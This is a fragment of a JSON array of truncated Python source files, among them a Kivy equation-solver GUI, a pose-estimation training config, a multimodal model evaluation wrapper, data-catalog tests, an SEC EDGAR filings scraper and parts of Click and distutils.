self.input_layout.add_widget(self.input_field)\r\n\r\n        self.start_button = Button(text=\"Start\", size_hint=(0.2, 1))\r\n        self.start_button.bind(on_press=self.setup_equations)\r\n        self.input_layout.add_widget(self.start_button)\r\n\r\n        # Scrollable layout for equation inputs\r\n        self.scroll = ScrollView(size_hint=(1, 0.7))\r\n        self.equation_layout = GridLayout(cols=3, size_hint_y=None, spacing=10, padding=10)\r\n        self.equation_layout.bind(minimum_height=self.equation_layout.setter(\"height\"))\r\n        self.scroll.add_widget(self.equation_layout)\r\n        self.add_widget(self.scroll)\r\n\r\n        # Solve and Clear buttons\r\n        self.button_layout = BoxLayout(orientation=\"horizontal\", size_hint=(1, 0.2), spacing=10)\r\n        self.solve_button = Button(text=\"Solve\", size_hint=(0.5, 1))\r\n        self.solve_button.bind(on_press=self.solve)\r\n        self.button_layout.add_widget(self.solve_button)\r\n\r\n        self.clear_button = Button(text=\"Clear\", size_hint=(0.5, 1))\r\n        self.clear_button.bind(on_press=self.clear_inputs)\r\n        self.button_layout.add_widget(self.clear_button)\r\n\r\n        self.add_widget(self.button_layout)\r\n\r\n    def setup_equations(self, instance):\r\n        try:\r\n            self.equation_count = int(self.input_field.text)\r\n        except ValueError:\r\n            self.input_label.text = \"Invalid input. Enter a number.\"\r\n            return\r\n\r\n        self.equation_layout.clear_widgets()\r\n        self.coefficients = []\r\n        self.constants = []\r\n\r\n        # Header Row: Coefficients and Constants\r\n        self.equation_layout.add_widget(Label(text=\"\", size_hint_y=None, height=40))  # Empty cell\r\n        self.equation_layout.add_widget(Label(text=\"Coefficients\", size_hint_y=None, height=40))\r\n        self.equation_layout.add_widget(Label(text=\"Constant\", size_hint_y=None, height=40))\r\n\r\n        # Rows for equations\r\n        for i in range(self.equation_count):\r\n            eq_label = Label(text=f\"Eq {i + 1}\", size_hint_y=None, height=100)  # Increased height for symmetry\r\n            self.equation_layout.add_widget(eq_label)\r\n\r\n            coefficient_input = TextInput(multiline=False, hint_text=\"e.g., 1 2 -3\", size_hint_y=None, height=100)\r\n            self.coefficients.append(coefficient_input)\r\n            self.equation_layout.add_widget(coefficient_input)\r\n\r\n            constant_input = TextInput(multiline=False, hint_text=\"e.g., 4\", size_hint_y=None, height=100)\r\n            self.constants.append(constant_input)\r\n            self.equation_layout.add_widget(constant_input)\r\n\r\n    def solve(self, instance):\r\n        try:\r\n            coefficients = [\r\n                list(map(float, coeff.text.split()))\r\n                for coeff in self.coefficients\r\n            ]\r\n            constants = [float(const.text) for const in self.constants]\r\n            solutions = solve_equations(coefficients, constants)\r\n            if isinstance(solutions, str):\r",
    "# Copyright (c) 2025 JD.com, Inc. and affiliates.\n# \n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n# \n#     https://www.apache.org/licenses/LICENSE-2.0\n# \n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# This file contains code from MuseTalk (Copyright (c) 2024 Tencent Music Entertainment Group),\n# licensed under the MIT License, available at https://github.com/TMElyralab/MuseTalk.\n\n#_base_ = ['../../../_base_/default_runtime.py']\n_base_ = ['default_runtime.py']\n\n# runtime\nmax_epochs = 270\nstage2_num_epochs = 30\nbase_lr = 4e-3\ntrain_batch_size = 32\nval_batch_size = 32\n\ntrain_cfg = dict(max_epochs=max_epochs, val_interval=10)\nrandomness = dict(seed=21)\n\n# optimizer\noptim_wrapper = dict(\n    type='OptimWrapper',\n    optimizer=dict(type='AdamW', lr=base_lr, weight_decay=0.05),\n    paramwise_cfg=dict(\n        norm_decay_mult=0, bias_decay_mult=0, bypass_duplicate=True))\n\n# learning rate\nparam_scheduler = [\n    dict(\n        type='LinearLR',\n        start_factor=1.0e-5,\n        by_epoch=False,\n        begin=0,\n        end=1000),\n    dict(\n        # use cosine lr from 150 to 300 epoch\n        type='CosineAnnealingLR',\n        eta_min=base_lr * 0.05,\n        begin=max_epochs // 2,\n        end=max_epochs,\n        T_max=max_epochs // 2,\n        by_epoch=True,\n        convert_to_iter_based=True),\n]\n\n# automatically scaling LR based on the actual training batch size\nauto_scale_lr = dict(base_batch_size=512)\n\n# codec settings\ncodec = dict(\n    type='SimCCLabel',\n    input_size=(288, 384),\n    sigma=(6., 6.93),\n    simcc_split_ratio=2.0,\n    normalize=False,\n    use_dark=False)\n\n# model settings\nmodel = dict(\n    type='TopdownPoseEstimator',\n    data_preprocessor=dict(\n        type='PoseDataPreprocessor',\n        mean=[123.675, 116.28, 103.53],\n        std=[58.395, 57.12, 57.375],\n        bgr_to_rgb=True),\n    backbone=dict(\n        _scope_='mmdet',\n        type='CSPNeXt',\n        arch='P5',\n        expand_ratio=0.5,\n        deepen_factor=1.,\n        widen_factor=1.,\n        out_indices=(4, ),\n        channel_attention=True,\n        norm_cfg=dict(type='SyncBN'),\n        act_cfg=dict(type='SiLU'),\n        init_cfg=dict(\n            type='Pretrained',\n            prefix='backbone.',\n            checkpoint='https://download.openmmlab.com/mmpose/v1/projects/'\n            'rtmpose/cspnext-l_udp-aic-coco_210e-256x192-273b7631_20230130.pth'  # noqa: E501\n        )),\n    head=dict(\n        type='RTMCCHead',\n        in_channels=1024,\n        out_channels=133,\n        input_size=codec['input_size'],\n        in_featuremap_size=(9, 12),\n        simcc_split_ratio=codec['simcc_split_ratio'],\n        final_layer_kernel_size=7,\n        gau_cfg=dict(\n            hidden_dims=256,\n            s=128,\n            expansion_factor=2,\n            dropout_rate=0.,\n            drop_path=0.,\n            act_fn='SiLU',\n            use_rel_bias=False,\n            pos_enc=False),\n        loss=dict(\n            type='KLDiscretLoss',\n            use_target_weight=True,\n            beta=10.,\n            label_softmax=True),\n        decoder=codec),\n    test_cfg=dict(flip_test=True, ))\n\n# base dataset settings\ndataset_type = 'UBody2dDataset'\ndata_mode = 'topdown'\ndata_root = 'data/UBody/'\n\nbackend_args = dict(backend='local')\n\nscenes = [\n    'Magic_show', 'Entertainment', 'ConductMusic', 'Online_class', 'TalkShow',\n    'Speech', 'Fitness', 'Interview', 'Olympic', 'TVShow', 'Singing',\n    'SignLanguage', 'Movie', 'LiveVlog', 'VideoConference'\n]\n\ntrain_datasets = [\n    dict(\n        type='CocoWholeBodyDataset',\n        data_root='data/coco/',\n        data_mode=data_mode,\n        ann_file='annotations/coco_wholebody_train_v1.0.json',\n        data_prefix=dict(img='train2017/'),\n        pipeline=[])\n]\n\nfor scene in scenes:\n    train_dataset = dict(\n        type=dataset_type,\n        data_root=data_root,\n        data_mode=data_mode,\n        ann_file=f'annotations/{scene}/train_annotations.json',\n        data_prefix=dict(img='images/'),\n        pipeline=[],\n        sample_interval=10)\n    train_datasets.append(train_dataset)\n\n# pipelines\ntrain_pipeline = [\n    dict(type='LoadImage', backend_args=backend_args),\n    dict(type='GetBBoxCenterScale'),\n    dict(type='RandomFlip', direction='horizontal'),\n    dict(type='RandomHalfBody'),\n    dict(\n        type='RandomBBoxTransform', scale_factor=[0.5, 1.5], rotate_factor=90),\n    dict(type='TopdownAffine', input_size=codec['input_size']),\n    dict(type='mmdet.YOLOXHSVRandomAug'),\n    dict(\n        type='Albumentation',\n        transforms=[\n            dict(type='Blur', p=0.1),\n            dict(type='MedianBlur', p=0.1),\n    ",
    "import sys\nimport torch\nfrom abc import abstractproperty\nfrom .base import BaseModel\nfrom ..smp import *\nfrom ..utils import DATASET_TYPE\nfrom transformers import AutoTokenizer, BitsAndBytesConfig\n\n\nclass TransCoreM(BaseModel):\n\n    INSTALL_REQ = True\n    INTERLEAVE = False\n\n    def load_pretrained_model(self, model_path, load_8bit=False, load_4bit=False, revision='main'):\n        from transcorem.model import TransCoreMQWenForCausalLM\n        from transcorem.constants import DEFAULT_IMAGE_PATCH_TOKEN, DEFAULT_IM_START_TOKEN, DEFAULT_IM_END_TOKEN\n        import transcorem.config_param as config_param\n        kwargs = {'revision': revision}\n        if load_8bit:\n            kwargs['load_in_8bit'] = True\n        elif load_4bit:\n            kwargs['load_in_4bit'] = True\n            kwargs['quantization_config'] = BitsAndBytesConfig(\n                load_in_4bit=True,\n                bnb_4bit_compute_dtype=torch.float16,\n                bnb_4bit_use_double_quant=True,\n                bnb_4bit_quant_type='nf4'\n            )\n        else:\n            kwargs['torch_dtype'] = torch.float16\n\n        config_param.model_path = model_path\n        tokenizer = AutoTokenizer.from_pretrained(\n            model_path, use_fast=False, revision=revision, trust_remote_code=True)\n        model = TransCoreMQWenForCausalLM.from_pretrained(\n            model_path, low_cpu_mem_usage=True, trust_remote_code=True, **kwargs)\n\n        image_processor = None\n        mm_use_im_start_end = getattr(model.config, 'mm_use_im_start_end', False)\n        mm_use_im_patch_token = getattr(model.config, 'mm_use_im_patch_token', True)\n        if mm_use_im_patch_token:\n            tokenizer.add_tokens([DEFAULT_IMAGE_PATCH_TOKEN], special_tokens=True)\n        if mm_use_im_start_end:\n            tokenizer.add_tokens([DEFAULT_IM_START_TOKEN, DEFAULT_IM_END_TOKEN], special_tokens=True)\n        model.resize_token_embeddings(len(tokenizer))\n\n        vision_tower = model.get_vision_tower()\n        if not vision_tower.is_loaded:\n            vision_tower.load_model()\n        vision_tower.to(device='cpu', dtype=torch.float16)\n        image_processor = vision_tower.image_processor\n\n        if hasattr(model.config, 'max_sequence_length'):\n            context_len = model.config.max_sequence_length\n        else:\n            context_len = 2048\n\n        return tokenizer, model, image_processor, context_len\n\n    def __init__(self,\n                 root=None,\n                 revision='main',\n                 **kwargs):\n\n        self.root = root\n        self.revision = revision\n        sys.path.append(root)\n\n        model_path = 'PCIResearch/TransCore-M'\n        assert osp.exists(model_path) or splitlen(model_path) == 2\n        self.tokenizer, self.model, self.image_processor, self.context_len = self.load_pretrained_model(\n            model_path=model_path, revision=revision)\n        self.model = self.model.cuda()\n        print('==============conv_mode: transcorem_v1')\n        self.conv_mode = 'transcorem_v1'\n\n        kwargs_default = dict(do_sample=False, temperature=0.0, max_new_tokens=512, top_p=None, num_beams=1)\n        kwargs_default.update(kwargs)\n        self.kwargs = kwargs_default\n        warnings.warn(f'Following kwargs received: {self.kwargs}, will use as generation config. ')\n\n    def use_custom_prompt(self, dataset):\n        assert dataset is not None\n        if DATASET_TYPE(dataset) == 'multi-choice':\n            return True\n        return False\n\n    def build_prompt(self, line, dataset=None):\n        assert dataset is None or isinstance(dataset, str)\n        assert self.use_custom_prompt(dataset)\n        tgt_path = self.dump_image(line, dataset)\n\n        question = line['question']\n        hint = line['hint'] if ('hint' in line and not pd.isna(line['hint'])) else None\n        if hint is not None:\n            question = hint + '\\n' + question\n\n        options = {\n            cand: line[cand]\n            for cand in string.ascii_uppercase\n            if cand in line and not pd.isna(line[cand])\n        }\n        for key, item in options.items():\n            question += f'\\n{key}. {item}'\n        prompt = question\n\n        if len(options):\n            prompt += (\n                '\\n\u8bf7\u76f4\u63a5\u56de\u7b54\u9009\u9879\u5b57\u6bcd\u3002' if cn_string(prompt) else\n                \"\\nAnswer with the option's letter from the given choices directly.\"\n            )\n        else:\n            prompt += '\\n\u8bf7\u76f4\u63a5\u56de\u7b54\u95ee\u9898\u3002' if cn_string(prompt) else '\\nAnswer the question directly.'\n        message = [dict(type='text', value=prompt)]\n        message.extend([dict(type='image', value=f) for f in tgt_path])\n        return message\n\n    def generate_inner(self, message, dataset=None):\n        from transcorem.mm_utils import highres_process_images, tokenizer_image_token, KeywordsStoppingCriteria\n        from transcorem.constants import (\n            IMAGE_TOKEN_INDEX, DEFAULT_IMAGE_TOKEN, DEFAULT_IM_START_TOKEN, DEFAULT_IM_END_TOKEN)\n        from transcorem.conversation import conv_templates, SeparatorStyle\n\n        prompt,",
    "import json\nimport requests\nfrom pathlib import Path\nimport concurrent.futures\n\ndef download_image(img_data):\n    try:\n        file_name = img_data['file_name']\n        # \u4ece\u670d\u52a1\u5668\u83b7\u53d6\u56fe\u7247URL\n        response = requests.get(f\"https://mygoapi.miyago9267.com/mygo/img?keyword={img_data['name']}\")\n        if response.status_code == 200:\n            data = response.json()\n            if data['urls']:\n                img_url = data['urls'][0]['url']\n                img_response = requests.get(img_url)\n                if img_response.status_code == 200:\n                    img_path = Path(__file__).parent.parent / 'images' / file_name\n                    img_path.write_bytes(img_response.content)\n                    print(f\"Downloaded: {file_name}\")\n                    return True\n    except Exception as e:\n        print(f\"Error downloading {file_name}: {e}\")\n    return False\n\ndef main():\n    # \u521b\u5efaimages\u76ee\u5f55\n    images_dir = Path(__file__).parent.parent / 'images'\n    images_dir.mkdir(exist_ok=True)\n    \n    # \u8bfb\u53d6\u56fe\u7247\u6620\u5c04\n    map_path = Path(__file__).parent.parent / 'data' / 'image_map.json'\n    with open(map_path, 'r', encoding='utf-8') as f:\n        image_map = json.load(f)\n    \n    # \u5e76\u884c\u4e0b\u8f7d\u56fe\u7247\n    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:\n        results = list(executor.map(download_image, image_map))\n    \n    success = sum(1 for r in results if r)\n    print(f\"\\nDownloaded {success} of {len(image_map)} images\")\n\nif __name__ == \"__main__\":\n    main() ",
    "import os\nimport tempfile\nfrom decimal import Decimal\n\nimport pytest\nfrom polyfactory.factories.pydantic_factory import ModelFactory\nfrom pydantic import BaseModel, Field\nfrom typing import List, Dict\n\nfrom pyspark.sql import SparkSession\nfrom unitycatalog.client import ApiClient, TablesApi, DataSourceFormat\nfrom unitycatalog.client.exceptions import NotFoundException\n\nfrom unitycatalog_pydantic import UCModel\n\n\nclass NestedColumn(BaseModel):\n    col1: str\n    col2: Decimal = Field(..., max_digits=10, decimal_places=2)\n\n\nclass NestedTable(UCModel):\n    \"\"\"Table with nested columns\"\"\"\n\n    col1: str\n    col2: int\n    nested: List[Dict[str, int]]\n    nested_model_col: NestedColumn\n\n\nclass FlatTable(UCModel):\n    col1: str\n    col2: int\n    col3: Decimal = Field(..., max_digits=10, decimal_places=2)\n\n\nclass ParquetTable(UCModel):\n    \"\"\"Table with columns\"\"\"\n\n    col1: str\n    col2: str\n\n\nclass ParquetTableFactory(ModelFactory[ParquetTable]):\n    __model__ = ParquetTable\n\n\nclass NestedTableFactory(ModelFactory[NestedTable]):\n    __model__ = NestedTable\n\n    @classmethod\n    def build(cls, **kwargs):\n        instance = super().build(**kwargs)\n        # Ensure the nested field has multiple entries\n        instance.nested = [{\"key1\": 1}, {\"key2\": 2}, {\"key3\": 3}]\n        return instance\n\n\nclass FlatTableFactory(ModelFactory[FlatTable]):\n    __model__ = FlatTable\n\n\n@pytest.mark.asyncio\nasync def test_create_table(catalog_client: ApiClient):\n    tables_api = TablesApi(catalog_client)\n    table_info = await NestedTable.create(\n        tables_api=tables_api,\n        catalog_name=\"unity\",\n        schema_name=\"default\",\n        storage_location=\"s3://test_bucket/test_path\",\n    )\n\n    assert table_info.name == \"nestedtable\"\n    assert table_info.catalog_name == \"unity\"\n    assert table_info.schema_name == \"default\"\n    assert table_info.table_type == \"EXTERNAL\"\n    assert table_info.data_source_format == DataSourceFormat.DELTA\n    assert table_info.comment == \"Table with nested columns\"\n    assert len(table_info.columns) == 4\n    assert table_info.columns[0].name == \"col1\"\n    assert table_info.columns[0].type_name == \"STRING\"\n    assert table_info.columns[1].name == \"col2\"\n    assert table_info.columns[1].type_name == \"LONG\"\n    assert table_info.columns[2].name == \"nested\"\n    assert table_info.columns[2].type_name == \"ARRAY\"\n    assert table_info.columns[3].name == \"nested_model_col\"\n    assert table_info.columns[3].type_name == \"STRUCT\"\n\n\n@pytest.mark.asyncio\nasync def test_create_table_by_alias(catalog_client: ApiClient):\n    tables_api = TablesApi(catalog_client)\n    table_info = await NestedTable.create(\n        tables_api=tables_api,\n        catalog_name=\"unity\",\n        schema_name=\"default\",\n        storage_location=\"s3://test_bucket/test_path\",\n        alias=\"nested_table\",\n    )\n\n    assert table_info.name == \"nested_table\"\n\n\n@pytest.mark.asyncio\nasync def test_delete_table(catalog_client: ApiClient):\n    tables_api = TablesApi(catalog_client)\n    await NestedTable.create(\n        tables_api=tables_api,\n        catalog_name=\"unity\",\n        schema_name=\"default\",\n        storage_location=\"s3://test_bucket/test_path\",\n        alias=\"table_to_delete\"\n    )\n\n    await NestedTable.delete(\n        tables_api=tables_api, catalog_name=\"unity\", schema_name=\"default\", alias=\"table_to_delete\"\n    )\n\n    # Try to get the deleted table and expect an error or None\n    with pytest.raises(NotFoundException):\n        await NestedTable.get(tables_api, catalog_name=\"unity\", schema_name=\"default\", alias=\"table_to_delete\")\n\n\n@pytest.mark.asyncio\nasync def test_create_parquet_table(catalog_client: ApiClient, spark: SparkSession):\n    tables_api = TablesApi(catalog_client)\n    fake_data = ParquetTableFactory.batch(size=10)\n\n    df = spark.createDataFrame([data.dict() for data in fake_data])\n\n    with tempfile.TemporaryDirectory() as temp_dir:\n        parquet_path = os.path.join(temp_dir, \"data.parquet\")\n        df.write.format(\"parquet\").save(parquet_path)\n\n        table_info = await ParquetTable.create(\n            tables_api=tables_api,\n            catalog_name=\"unity\",\n            schema_name=\"default\",\n            storage_location=parquet_path,\n            data_source_format=DataSourceFormat.PARQUET,\n        )\n\n        assert table_info.name == \"parquettable\"\n        assert table_info.data_source_format == DataSourceFormat.PARQUET\n\n        rows = spark.table(\"default.parquettable\").collect()\n        rows = sorted(rows, key=lambda x: x.col1)\n        expected_rows = sorted(df.collect(), key=lambda x: x.col1)\n        assert len(rows) == 10\n\n        assert rows[0].col1 == expected_rows[0].col1\n        assert rows[0].col2 == expected_rows[0].col2\n\n\n@pytest.mark.asyncio\nasync def test_create_csv_table(catalog_client: ApiClient, spark: SparkSession):\n    tables_api = TablesApi(catalog_client)\n    fake_data = FlatTableFactory.batch(size=10)\n    df = spark.createDataFrame([data.dict() for data in fake_data])\n\n    with tempfile.Tempor",
    "import numpy as np\nimport torch.nn.functional as F\nfrom torch import nn\nfrom .model import MLPLayers\n\n\nclass LinearProbe(nn.Module):\n    def __init__(self, model, mlp, freeze, in_ch, out_ch, act=None):\n        \"\"\"\n        Args:\n            model: nn.Module\n            mlp: bool, if True, then use the MLP layer as the linear probe module\n            freeze: bool, if Ture, then freeze all the CLAP model's layers when training the linear probe\n            in_ch: int, the output channel from CLAP model\n            out_ch: int, the output channel from linear probe (class_num)\n            act: torch.nn.functional, the activation function before the loss function\n        \"\"\"\n        super().__init__()\n        in_ch = 512\n        self.clap_model = model\n        self.clap_model.text_branch = None  # to save memory\n        self.freeze = freeze\n        if mlp:\n            self.lp_layer = MLPLayers(units=[in_ch, in_ch * 2, out_ch])\n        else:\n            self.lp_layer = nn.Linear(in_ch, out_ch)\n\n        if self.freeze:\n            for param in self.clap_model.parameters():\n                param.requires_grad = False\n\n        if act == \"None\":\n            self.act = None\n        elif act == \"relu\":\n            self.act = nn.ReLU()\n        elif act == \"elu\":\n            self.act = nn.ELU()\n        elif act == \"prelu\":\n            self.act = nn.PReLU(num_parameters=in_ch)\n        elif act == \"softmax\":\n            self.act = nn.Softmax(dim=-1)\n        elif act == \"sigmoid\":\n            self.act = nn.Sigmoid()\n\n    def forward(self, x, mix_lambda=None, device=None):\n        \"\"\"\n        Args:\n            x: waveform, torch.tensor [batch, t_samples] / batch of mel_spec and longer list\n            mix_lambda: torch.tensor [batch], the mixup lambda\n        Returns:\n            class_prob: torch.tensor [batch, class_num]\n\n        \"\"\"\n        # batchnorm cancel grandient\n        if self.freeze:\n            self.clap_model.eval()\n\n        x = self.clap_model.audio_projection(\n            self.clap_model.audio_branch(x, mixup_lambda=mix_lambda, device=device)[\n                \"embedding\"\n            ]\n        )\n        out = self.lp_layer(x)\n        if self.act is not None:\n            out = self.act(out)\n        return out\n",
    "\"\"\"\nThis module contains implementations for the termui module. To keep the\nimport time of Click down, some infrequently used functionality is\nplaced in this module and only imported as needed.\n\"\"\"\n\nimport contextlib\nimport math\nimport os\nimport sys\nimport time\nimport typing as t\nfrom gettext import gettext as _\nfrom io import StringIO\nfrom shutil import which\nfrom types import TracebackType\n\nfrom ._compat import _default_text_stdout\nfrom ._compat import CYGWIN\nfrom ._compat import get_best_encoding\nfrom ._compat import isatty\nfrom ._compat import open_stream\nfrom ._compat import strip_ansi\nfrom ._compat import term_len\nfrom ._compat import WIN\nfrom .exceptions import ClickException\nfrom .utils import echo\n\nV = t.TypeVar(\"V\")\n\nif os.name == \"nt\":\n    BEFORE_BAR = \"\\r\"\n    AFTER_BAR = \"\\n\"\nelse:\n    BEFORE_BAR = \"\\r\\033[?25l\"\n    AFTER_BAR = \"\\033[?25h\\n\"\n\n\nclass ProgressBar(t.Generic[V]):\n    def __init__(\n        self,\n        iterable: t.Optional[t.Iterable[V]],\n        length: t.Optional[int] = None,\n        fill_char: str = \"#\",\n        empty_char: str = \" \",\n        bar_template: str = \"%(bar)s\",\n        info_sep: str = \"  \",\n        show_eta: bool = True,\n        show_percent: t.Optional[bool] = None,\n        show_pos: bool = False,\n        item_show_func: t.Optional[t.Callable[[t.Optional[V]], t.Optional[str]]] = None,\n        label: t.Optional[str] = None,\n        file: t.Optional[t.TextIO] = None,\n        color: t.Optional[bool] = None,\n        update_min_steps: int = 1,\n        width: int = 30,\n    ) -> None:\n        self.fill_char = fill_char\n        self.empty_char = empty_char\n        self.bar_template = bar_template\n        self.info_sep = info_sep\n        self.show_eta = show_eta\n        self.show_percent = show_percent\n        self.show_pos = show_pos\n        self.item_show_func = item_show_func\n        self.label: str = label or \"\"\n\n        if file is None:\n            file = _default_text_stdout()\n\n            # There are no standard streams attached to write to. For example,\n            # pythonw on Windows.\n            if file is None:\n                file = StringIO()\n\n        self.file = file\n        self.color = color\n        self.update_min_steps = update_min_steps\n        self._completed_intervals = 0\n        self.width: int = width\n        self.autowidth: bool = width == 0\n\n        if length is None:\n            from operator import length_hint\n\n            length = length_hint(iterable, -1)\n\n            if length == -1:\n                length = None\n        if iterable is None:\n            if length is None:\n                raise TypeError(\"iterable or length is required\")\n            iterable = t.cast(t.Iterable[V], range(length))\n        self.iter: t.Iterable[V] = iter(iterable)\n        self.length = length\n        self.pos = 0\n        self.avg: t.List[float] = []\n        self.last_eta: float\n        self.start: float\n        self.start = self.last_eta = time.time()\n        self.eta_known: bool = False\n        self.finished: bool = False\n        self.max_width: t.Optional[int] = None\n        self.entered: bool = False\n        self.current_item: t.Optional[V] = None\n        self.is_hidden: bool = not isatty(self.file)\n        self._last_line: t.Optional[str] = None\n\n    def __enter__(self) -> \"ProgressBar[V]\":\n        self.entered = True\n        self.render_progress()\n        return self\n\n    def __exit__(\n        self,\n        exc_type: t.Optional[t.Type[BaseException]],\n        exc_value: t.Optional[BaseException],\n        tb: t.Optional[TracebackType],\n    ) -> None:\n        self.render_finish()\n\n    def __iter__(self) -> t.Iterator[V]:\n        if not self.entered:\n            raise RuntimeError(\"You need to use progress bars in a with block.\")\n        self.render_progress()\n        return self.generator()\n\n    def __next__(self) -> V:\n        # Iteration is defined in terms of a generator function,\n        # returned by iter(self); use that to define next(). This works\n        # because `self.iter` is an iterable consumed by that generator,\n        # so it is re-entry safe. Calling `next(self.generator())`\n        # twice works and does \"what you want\".\n        return next(iter(self))\n\n    def render_finish(self) -> None:\n        if self.is_hidden:\n            return\n        self.file.write(AFTER_BAR)\n        self.file.flush()\n\n    @property\n    def pct(self) -> float:\n        if self.finished:\n            return 1.0\n        return min(self.pos / (float(self.length or 1) or 1), 1.0)\n\n    @property\n    def time_per_iteration(self) -> float:\n        if not self.avg:\n            return 0.0\n        return sum(self.avg) / float(len(self.avg))\n\n    @property\n    def eta(self) -> float:\n        if self.length is not None and not self.finished:\n            return self.time_per_iteration * (self.length - self.pos)\n        return 0.0\n\n    def format_eta(self) -> str:\n        if self.eta_known:\n            t = int(self.eta)\n            seconds = t % 60\n            t //= 60\n            m",
    "import requests\nimport pandas as pd\nfrom bs4 import BeautifulSoup\nimport time\nfrom datetime import datetime\nimport os\nfrom pathlib import Path\nimport logging\nimport json\nfrom typing import Optional, List, Dict\nimport re\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nimport backoff\nimport sqlite3\nfrom tqdm import tqdm\n\nclass EDGARScraper:\n    def __init__(self, email: str, output_dir: str = \"def14a_filings\", max_retries: int = 3):\n        \"\"\"\n        Initialize the scraper\n        :param email: Email for SEC tracking\n        :param output_dir: Directory to save filings\n        :param max_retries: Maximum number of retries for failed requests\n        \"\"\"\n        self.headers = {\n            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 {email}'\n        }\n        self.base_url = \"https://www.sec.gov/Archives\"\n        self.output_dir = output_dir\n        self.max_retries = max_retries\n\n        # Create directories\n        Path(output_dir).mkdir(exist_ok=True)\n        Path(output_dir + '/logs').mkdir(exist_ok=True)\n\n        # Setup logging\n        self._setup_logging()\n\n        # Initialize database\n        self.db_path = os.path.join(output_dir, 'filings.db')\n        self._setup_database()\n\n    def _setup_logging(self):\n        \"\"\"Configure logging with both file and console handlers\"\"\"\n        log_file = os.path.join(self.output_dir, 'logs', f'scraper_{datetime.now().strftime(\"%Y%m%d_%H%M%S\")}.log')\n\n        logging.basicConfig(\n            level=logging.INFO,\n            format='%(asctime)s - %(levelname)s - %(message)s',\n            handlers=[\n                logging.FileHandler(log_file),\n                logging.StreamHandler()\n            ]\n        )\n        self.logger = logging\n\n    def _setup_database(self):\n        \"\"\"Initialize SQLite database for tracking scraping progress\"\"\"\n        with sqlite3.connect(self.db_path) as conn:\n            conn.execute('''\n                CREATE TABLE IF NOT EXISTS filings (\n                    cik TEXT,\n                    filing_date TEXT,\n                    file_path TEXT,\n                    status TEXT,\n                    last_updated TIMESTAMP,\n                    url TEXT,\n                    PRIMARY KEY (cik, filing_date)\n                )\n            ''')\n            conn.execute('''\n                CREATE TABLE IF NOT EXISTS companies (\n                    cik TEXT PRIMARY KEY,\n                    name TEXT,\n                    last_scraped TIMESTAMP\n                )\n            ''')\n\n    @backoff.on_exception(backoff.expo,\n                         (requests.exceptions.RequestException,\n                          requests.exceptions.HTTPError),\n                         max_tries=3)\n    def _make_request(self, url: str) -> requests.Response:\n        \"\"\"Make request with exponential backoff retry\"\"\"\n        time.sleep(0.1)  # SEC rate limit\n        response = requests.get(url, headers=self.headers)\n        response.raise_for_status()\n        return response\n\n    def get_company_ciks(self) -> List[str]:\n        \"\"\"Get list of company CIKs from SEC\"\"\"\n        try:\n            url = \"https://www.sec.gov/files/company_tickers.json\"\n            response = self._make_request(url)\n            data = response.json()\n\n            # Convert to DataFrame and zero-pad CIKs to 10 digits\n            df = pd.DataFrame.from_dict(data, orient='index')\n            df['cik_str'] = df['cik_str'].astype(str).str.zfill(10)\n\n            # Save to database\n            with sqlite3.connect(self.db_path) as conn:\n                for _, row in df.iterrows():\n                    conn.execute('''\n                        INSERT OR REPLACE INTO companies (cik, name)\n                        VALUES (?, ?)\n                    ''', (row['cik_str'], row['title']))\n\n            return df['cik_str'].tolist()\n        except Exception as e:\n            self.logger.error(f\"Error getting company CIKs: {str(e)}\")\n            return []\n\n    def get_filing_links(self, cik: str, filing_type: str = \"DEF 14A\", limit: int = 5) -> List[Dict]:\n        \"\"\"Get DEF 14A filing links for a company\"\"\"\n        url = f\"https://www.sec.gov/cgi-bin/browse-edgar?action=getcompany&CIK={cik}&type={filing_type.replace(' ', '+')}&dateb=&owner=exclude&count={limit}\"\n\n        try:\n            response = self._make_request(url)\n            soup = BeautifulSoup(response.text, 'html.parser')\n\n            filings = []\n            doc_table = soup.find('table', {'class': 'tableFile2'})\n\n            if not doc_table:\n                self.logger.warning(f\"No filings found for CIK {cik}\")\n                return []\n\n            for row in doc_table.find_all('tr')[1:]:\n                cols = row.find_all('td')\n                if len(cols) >= 4:\n                    filing_type = cols[0].text.strip()\n                    if filing_type == \"DEF 14A\":\n                        filing_date = cols[3].text.strip()\n                        doc_l",
    "# Copyright (C) 2005, 2006 Martin von L\u00f6wis\n# Licensed to PSF under a Contributor Agreement.\n# The bdist_wininst command proper\n# based on bdist_wininst\n\"\"\"\nImplements the bdist_msi command.\n\"\"\"\n\nimport os\nimport sys\nimport warnings\nfrom distutils.core import Command\nfrom distutils.dir_util import remove_tree\nfrom distutils.sysconfig import get_python_version\nfrom distutils.version import StrictVersion\nfrom distutils.errors import DistutilsOptionError\nfrom distutils.util import get_platform\nfrom distutils import log\nimport msilib\nfrom msilib import schema, sequence, text\nfrom msilib import Directory, Feature, Dialog, add_data\n\nclass PyDialog(Dialog):\n    \"\"\"Dialog class with a fixed layout: controls at the top, then a ruler,\n    then a list of buttons: back, next, cancel. Optionally a bitmap at the\n    left.\"\"\"\n    def __init__(self, *args, **kw):\n        \"\"\"Dialog(database, name, x, y, w, h, attributes, title, first,\n        default, cancel, bitmap=true)\"\"\"\n        Dialog.__init__(self, *args)\n        ruler = self.h - 36\n        bmwidth = 152*ruler/328\n        #if kw.get(\"bitmap\", True):\n        #    self.bitmap(\"Bitmap\", 0, 0, bmwidth, ruler, \"PythonWin\")\n        self.line(\"BottomLine\", 0, ruler, self.w, 0)\n\n    def title(self, title):\n        \"Set the title text of the dialog at the top.\"\n        # name, x, y, w, h, flags=Visible|Enabled|Transparent|NoPrefix,\n        # text, in VerdanaBold10\n        self.text(\"Title\", 15, 10, 320, 60, 0x30003,\n                  r\"{\\VerdanaBold10}%s\" % title)\n\n    def back(self, title, next, name = \"Back\", active = 1):\n        \"\"\"Add a back button with a given title, the tab-next button,\n        its name in the Control table, possibly initially disabled.\n\n        Return the button, so that events can be associated\"\"\"\n        if active:\n            flags = 3 # Visible|Enabled\n        else:\n            flags = 1 # Visible\n        return self.pushbutton(name, 180, self.h-27 , 56, 